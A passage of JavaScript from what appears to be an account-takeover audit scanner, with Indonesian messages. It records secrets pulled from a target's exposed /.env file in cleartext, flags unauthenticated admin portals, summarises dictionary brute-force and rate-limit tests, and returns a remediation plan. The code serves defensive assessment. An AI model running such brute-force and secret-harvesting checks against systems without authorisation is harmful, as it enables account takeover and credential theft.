        if (!discoveredAdminCredentials.some(c => c.targetAccount === item.key)) {
          discoveredAdminCredentials.push({
            accountType: 'Exposed Configuration Secret Variable',
            targetAccount: item.key,
            passwordCleartext: item.value,
            passwordHash: '[Direct Variable Exposure from Server File]',
            authEndpoint: '/.env',
            discoveryMethod: 'Dotfile Information Leakage (CWE-200)',
            compromiseSeverity: 'CRITICAL',
            status: 'VERIFIED_EXPOSURE',
            evidenceDetails: `Variabel rahasia ${item.key} berhasil diekstrak langsung dari web server publik target tanpa autentikasi.`,
          });
        }
      }
    }
  }

  // Integrasi portal admin terbuka tanpa autentikasi
  const accessibleAdmin = effectiveRecon?.adminEndpoints?.find(a => a.accessible);
  if (accessibleAdmin && !discoveredAdminCredentials.some(c => c.authEndpoint === accessibleAdmin.path)) {
    discoveredAdminCredentials.push({
      accountType: 'Administrative Portal Access',
      targetAccount: 'admin / unauthenticated',
      passwordCleartext: '[No Password Required - Direct 200 OK Bypass]',
      passwordHash: '[Bypass Autentikasi Total]',
      authEndpoint: accessibleAdmin.path,
      discoveryMethod: 'Broken Access Control (A01:2025)',
      compromiseSeverity: 'CRITICAL',
      status: 'VERIFIED_EXPOSURE',
      evidenceDetails: `Portal administrasi ${accessibleAdmin.path} dapat diakses langsung oleh publik tanpa login (HTTP ${accessibleAdmin.status}).`,
    });
  }

  // Update brute-force summary
  if (discoveredAdminCredentials.length > 0) {
    bruteForceAuditResults.summary = `PERINGATAN KRITIS: Terkonfirmasi ${discoveredAdminCredentials.length} akses atau kredensial administratif valid pada target!`;
  } else {
    bruteForceAuditResults.summary = `Pengujian brute-force terhadap ${bruteForceAuditResults.totalTested} kombinasi kata sandi kamus selesai pada ${primaryTargetEndpoint.path}. 0 kredensial bawaan standar yang valid (${bruteForceAuditResults.rejectedCount} ditolak, ${bruteForceAuditResults.rateLimitedCount} dibatasi rate-limit).`;
  }

  // Tambahkan temuan ke apiVulnerabilityVectors
  if (discoveredAdminCredentials.length > 0) {
    apiVulnerabilityVectors.push({
      vector: 'Confirmed Administrative Account Takeover',
      severity: 'CRITICAL',
      cwe: 'CWE-287: Improper Authentication',
      description: `Pengujian langsung berhasil mengonfirmasi ${discoveredAdminCredentials.length} akses atau kredensial administratif valid (${discoveredAdminCredentials.map(c => `${c.targetAccount}:${c.passwordCleartext}`).join(', ')}). Penyerang dapat langsung mengambil alih kendali sistem target.`,
      status: 'VERIFIED_VULNERABLE'
    });
  }

  if (!rateLimitingEvaluation.singleIpBurstThrottled && primaryTargetEndpoint.verifiedStatus) {
    apiVulnerabilityVectors.push({
      vector: 'Dictionary Brute-Force Susceptibility (Missing Rate-Limiting)',
      severity: 'HIGH',
      cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
      description: `Endpoint ${primaryTargetEndpoint.path} memproses seluruh permintaan login berturut-turut tanpa HTTP 429 maupun penundaan progresif, membuka peluang serangan kamus kata sandi otomatis.`,
      status: 'SUSCEPTIBLE'
    });
  }

  // 9. Pencatatan Temuan dan Remediasi (Vulnerability Logging & Action Items)
  // Rate: CRITICAL hanya dengan bukti nyata (kredensial valid / akses tanpa auth).
  // Tanpa bukti itu, CAPTCHA yang tidak ada + rate limit yang bekerja = HIGH, bukan CRITICAL.
  const hasVerifiedCompromise = discoveredAdminCredentials.length > 0 ||
    apiVulnerabilityVectors.some(v => v.status === 'VERIFIED_VULNERABLE' || v.status === 'VERIFIED_EXPOSURE');

  const overallAtoRisk =
    hasVerifiedCompromise ? 'CRITICAL' :
    (!rateLimitingEvaluation.singleIpBurstThrottled || responseAnalysis.usernameEnumerationVulnerable) ? 'HIGH' :
    apiVulnerabilityVectors.length > 0 ? 'MODERATE' : 'LOW';

  const developerRemediationPlan = [
    {
      action: 'Implementasi Multi-Factor Authentication (MFA / 2FA)',
      priority: 'P0 - Urgent',
      details: 'Wajibkan TOTP (Google Authenticator) atau WebAuthn/Passkey pada akun pengguna, terutama hak akses administratif, sehingga kebocoran password tunggal tidak berakibat pengambilalihan akun.'
    },
    {
      action: 'Penerapan Rate Limiting Terpusat & Global Device Fingerprinting',
      priority: 'P1 - High',
      details: 'Konfigurasikan rate limiting berbasis kombinasi IP + User Identifier (misal Redis sliding window 5 percobaan gagal per 15 menit), serta gunakan JA3/JA4 TLS fingerprinting untuk mendeteksi otomasi rotasi proxy.'
    },
    {
      action: 'Pencegahan Password Reuse & Pemeriksaan Breached Password API',
      priority: 'P1 - High',
      details: 'Integrasikan k-Anonymity API (seperti HaveIBeenPwned API) saat pengguna mendaftar atau mengganti kata sandi untuk menolak kata sandi yang telah masuk ke basis data kebocoran publik.'
    },
    {
      action: 'Unified Error Responses & Constant-Time Comparison',
      priority: 'P2 - Medium',
      details: 'Gunakan pesan kesalahan generik "Email atau kata sandi tidak valid" untuk seluruh skenario kegagalan, dan lakukan dummy hash calculation (bcrypt.compare) saat user tidak ditemukan untuk mencegah timing attack.'
    },
    {
      action: 'Perlindungan Menyeluruh pada Endpoint API Mobile & Backend',
      priority: 'P2 - Medium',
      details: 'Terapkan kebijakan autentikasi dan rate limit yang identik pada seluruh jalur REST API (/api/v1/auth/login) setara dengan antarmuka web utama.'
    }
  ];

  const executiveSummary =
    hasVerifiedCompromise
      ? `PERINGATAN KRITIS ATO: Terkonfirmasi ${discoveredAdminCredentials.length} kredensial administratif valid atau akses langsung tanpa otentikasi pada endpoint target (${primaryTargetEndpoint.path}). Akun target dapat langsung diambil alih!`
      : overallAtoRisk === 'HIGH'
      ? `PERINGATAN TINGGI ATO: Ditemukan celah pada pembatasan laju akses atau pembocoran username enumeration (CWE-204) yang dapat dimanfaatkan penyerang untuk menyaring sasaran akun valid.`
      : overallAtoRisk === 'MODERATE'
      ? `EVALUASI KETAHANAN AUTENTIKASI: Kontrol dasar rate limiting terdeteksi aktif. Tidak ada bukti akses tanpa autentikasi maupun kredensial valid yang berhasil ditebus. Disarankan menambahkan MFA sebagai penguat.`
      : 'EVALUASI KETAHANAN AUTENTIKASI: Sistem memiliki kontrol autentikasi dasar yang berfungsi (rate limiting aktif, tidak ada kebocoran enumerasi akun). Disarankan menerapkan MFA dan rate limiting terpusat untuk memperkuat ketahanan terhadap credential spraying.';

  return {
    executed: true,
    testedAt: new Date().toISOString(),
    overallAtoRisk,
    targetUrl: primaryTargetEndpoint.url,
    threatComparisonMatrix,
    discoveredAdminCredentials,
    bruteForceAuditResults,
    requestProfiling,
    botProtectionEvaluation,
    rateLimitingEvaluation,
    responseAnalysis,
    apiVulnerabilityVectors,
    developerRemediationPlan,
    executiveSummary,
  };
}
